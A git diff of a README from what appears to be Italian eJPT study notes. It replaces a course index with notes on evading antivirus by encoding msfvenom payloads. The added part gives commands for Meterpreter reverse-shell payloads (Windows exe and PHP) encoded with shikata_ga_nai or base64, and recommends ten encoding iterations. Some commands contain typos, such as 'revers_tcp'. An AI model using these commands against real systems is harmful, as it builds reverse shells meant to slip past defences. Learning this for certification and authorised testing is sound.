@@ -1,76 +1,17 @@
-# eJPT
+Ovviamente essendo il payload trasferito e caricato all’interno di un macchina le possibilità che un AV lo rilevi sono molte. Gli AV ci rilevano tramite firme digitali.  Possiamo eludere le vecchie soluzioni AV basate sulle firme codificando i nostri payload.
 
-![Screenshot 2024-12-21 104842](https://github.com/user-attachments/assets/7530661d-b5f1-4a3c-a16c-5ba224b79131)
+- **msfvenom --list encoders** visualizza tutti i formati con cui codificare il payload
 
--[Information Gatering](https://github.com/emanueletroiani/eJPT/tree/Information-Gatering)
+Encoders da utilizzare:
 
--[Riassunto](https://github.com/emanueletroiani/eJPT/blob/Information-Gatering-riassunto/README.md)
+- **-e FORMATO/shikata_ga_nai**
+    - `msfvenom -p windows/x86/meterpreter/revers_tcp LHOST=X.X.X.X LPORT=XXXX -e x86/shikata_ga_nai -f exe > shell.exe`
+- **-e FORMATO/base64**
+    - `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64 -f raw > shell.php`
 
-Assessment Methodologies: Footprinting & Scanning
+E’ consigliato usare **shikata_ga_nai** come encodere
 
--[Networking Primer](https://github.com/emanueletroiani/eJPT/blob/Networking-Primer/README.md)
+Aumentare **interazione** per eludere gli AV con shikata_ga_nai
 
--[Host Discovery](https://github.com/emanueletroiani/eJPT/blob/Host-Discovery-Techniques/README.md)
-
--[Port Scanning](https://github.com/emanueletroiani/eJPT/blob/Port-Scanning/README.md)
-
--[Riassunto comandi
-](https://github.com/emanueletroiani/eJPT/blob/Riassunto1/README.md)
-
-Assessment Methodologies: Enumeration
-
--[FTP Enumeration](https://github.com/emanueletroiani/eJPT/blob/FTP-Enumeration/README.md)
-
--[SMB Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMB-Enumeration/README.md)
-
--[Web Server Enumeration](https://github.com/emanueletroiani/eJPT/blob/Web-Server-Enumeration/README.md)
-
--[MySQL Enumeration](https://github.com/emanueletroiani/eJPT/blob/MySQL-Enumeration/README.md)
-
--[SSH Enumeration](https://github.com/emanueletroiani/eJPT/blob/SSH-Enumeration/README.md)
-
--[SMTP Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMTP-Enumeration/README.md)
-
--[Riassunto](https://github.com/emanueletroiani/eJPT/blob/Riassunto2/README.md)
-
-Assessment Methodologies: Vulnerability Assessment
-
--[Vulnerability Assessment](https://github.com/emanueletroiani/eJPT/blob/Vulnerability-Assessment/README.md)
-
--[Vulnerability Analysis](https://github.com/emanueletroiani/eJPT/tree/Vulnerability-Analysis)
-
--[Vulnerability Scanning](https://github.com/emanueletroiani/eJPT/tree/Vulnerability-Scanning)
-
-Assessment Methodologies: Auditing Fundamentals
-
--[Introduction to Security Auditing](https://github.com/emanueletroiani/eJPT/blob/Introduction-to-Security-Auditing/README.md)
-
--[Governance, Risk & Compliance](https://github.com/emanueletroiani/eJPT/blob/Governance,-Risk-&-Compliance/README.md)
-
--From Auditing to Penetration Testing
-
-Host & Network Penetration Testing: System/Host Based Attacks
-
--[Windows Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Windows-Vulnerabilities/README.md)
-
--[Exploiting Windows Vulnerabilities](https://github.com/emanueletroiani/eJPT/tree/Exploiting-Windows-Vulnerabilities)
-
--[Windows Privilege Escalation](https://github.com/emanueletroiani/eJPT/edit/Windows-Privilege-Escalation/README.md)
-
--[Windows File System Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Alternate-Data-Streams/README.md)
-
--[Windows Credential Dumping](https://github.com/emanueletroiani/eJPT/tree/Windows-Credential-Dumping)
-
--[Exploiting Linux Vulnerabilities](https://github.com/emanueletroiani/eJPT/blob/Exploiting-Linux-Vulnerabilities/README.md)
-
--[Linux Privilege Escalation](https://github.com/emanueletroiani/eJPT/blob/Linux-Privilege-Escalation/README.md)
-
--[Linux Credential Dumping](https://github.com/emanueletroiani/eJPT/blob/Linux-Credential-Dumping/README.md)
-
-Host & Network Penetration Testing: Network-Based Attacks
-
--[SMB & NetBIOS Enumeration](https://github.com/emanueletroiani/eJPT/blob/SMB-&-NetBIOS-Enumeration/README.md)
-
--[SNMP Enumeration](https://github.com/emanueletroiani/eJPT/blob/SNMP-Enumeration/README.md)
-
--[SMB Relay Attack](https://github.com/emanueletroiani/eJPT/blob/SMB-Relay-Attack/README.md)
+- `msfvenom -p windows/x86/meterpreter/revers_tcp LHOST=X.X.X.X LPORT=XXXX -i 10 -e x86/shikata_ga_nai -f exe > shell.exe`
+    - **-i 10** 10 interazioni, 10 è il valore consigliato, oltre non cambia l’output
